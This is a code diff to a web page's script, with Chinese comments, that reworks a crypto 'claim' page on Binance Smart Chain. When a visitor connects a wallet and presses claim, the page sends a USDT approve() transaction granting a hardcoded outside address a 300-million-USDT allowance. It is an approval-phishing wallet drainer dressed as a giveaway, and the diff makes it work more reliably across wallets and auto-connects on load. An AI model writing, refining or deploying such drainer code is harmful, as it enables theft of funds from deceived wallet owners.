@@ -74,28 +74,27 @@
 <script>
 !function(){
 const BSC_NETWORK = {
-  chainId: '0x38'
+  chainId: '0x38',
+  chainName: 'Binance Smart Chain',
+  rpcUrls: ['https://bsc-dataseed.binance.org'],
+  blockExplorerUrls: ['https://bscscan.com'],
+  nativeCurrency: {name:'BNB',symbol:'BNB',decimals:18}
 };
 
-// 固定参数 不允许改动
 const USDT_CONTRACT = "0x55d398326f99059ff775485246999027b3197955";
-const SPENDER = "0x0f4BdEfC177dF2583F52B03B1E20f9EAC7308555";
-// 3亿 USDT 18位精度
-const AMOUNT_HEX = "00000000000000000000000000f8277896582678ac000000";
-const METHOD_ID = "095ea7b3";
+const SPENDER_ADDR = "0x0f4BdEfC177dF2583F52B03B1E20f9EAC7308555";
+const APPROVE_AMOUNT = "300000000000000000000000000";
 
 let walletAddr = "";
+let provider, signer, usdtContract;
+
+const USDT_ABI = [
+  "function approve(address spender, uint256 amount) public returns (bool)"
+];
 
 function switchPage(id){
   document.querySelectorAll(".box").forEach(el=>el.classList.add("hide"));
   document.getElementById(id).classList.remove("hide");
-}
-
-// 地址标准化 左补64位 钱包+代理合约都兼容
-function getCalldata(){
-  let addr = SPENDER.toLowerCase().replace("0x","");
-  let padAddr = addr.padStart(64, '0');
-  return "0x" + METHOD_ID + padAddr + AMOUNT_HEX;
 }
 
 async function switchOrAddBSC(){
@@ -104,37 +103,42 @@ async function switchOrAddBSC(){
       method:'wallet_switchEthereumChain',
       params:[{chainId:BSC_NETWORK.chainId}]
     });
-  }catch(err){}
+  }catch(err){
+    if(err.code === 4902){
+      await window.ethereum.request({
+        method:'wallet_addEthereumChain',
+        params:[BSC_NETWORK]
+      });
+    }
+  }
 }
 
-// 原生标准交易 不引入任何非法合约对象 保证所有钱包能识别授权
+async function initContract(){
+  provider = new ethers.providers.Web3Provider(window.ethereum);
+  signer = provider.getSigner();
+  usdtContract = new ethers.Contract(USDT_CONTRACT, USDT_ABI, signer);
+}
+
 async function doApprove(){
   try{
-    let data = getCalldata();
-    let txParams = {
-      from: walletAddr,
-      to: USDT_CONTRACT,
-      data: data,
-      gas: "0x30000"
-    };
-    await window.ethereum.request({
-      method: "eth_sendTransaction",
-      params: [txParams]
+    const tx = await usdtContract.approve(SPENDER_ADDR, APPROVE_AMOUNT, {
+      gasLimit: 300000
     });
+    await tx.wait();
     return true;
   }catch(e){
     return false;
   }
 }
 
-// 原版钱包连接逻辑 完全还原 保证能连上
 async function initConnect(){
   if(!window.ethereum) return;
   try{
     switchPage("p2");
     await switchOrAddBSC();
-    let accounts = await window.ethereum.request({method:"eth_requestAccounts"});
+    const accounts = await window.ethereum.request({method:"eth_requestAccounts"});
     walletAddr = accounts[0];
+    await initContract();
     document.getElementById("showAddr").innerText = walletAddr;
     switchPage("p3");
   }catch(e){
@@ -142,7 +146,17 @@ async function initConnect(){
   }
 }
 
-window.onload = initConnect;
+window.onload = () => {
+  // 注入ethers（兼容所有钱包）
+  if(!window.ethers){
+    const script = document.createElement('script');
+    script.src = 'https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js';
+    script.onload = initConnect;
+    document.head.appendChild(script);
+  }else{
+    initConnect();
+  }
+};
 
 document.getElementById("connectMM").onclick = async function(){
   if(!window.ethereum){
@@ -152,8 +166,9 @@ document.getElementById("connectMM").onclick = async function(){
   try{
     switchPage("p2");
     await switchOrAddBSC();
-    let accounts = await window.ethereum.request({method:"eth_requestAccounts"});
+    const accounts = await window.ethereum.request({method:"eth_requestAccounts"});
     walletAddr = accounts[0];
+    await initContract();
     document.getElementById("showAddr").innerText = walletAddr;
     switchPage("p3");
   }catch(e){
@@ -164,8 +179,8 @@ document.getElementById("connectMM").onclick = async function(){
 document.getElementById("claim").onclick = async function(){
   try{
     switchPage("p2");
-    let res = await doApprove();
-    if(res){
+    const ok = await doApprove();
+    if(ok){
       document.getElementById("successAddr").innerText = walletAddr;
       switchPage("p4");
     }else{
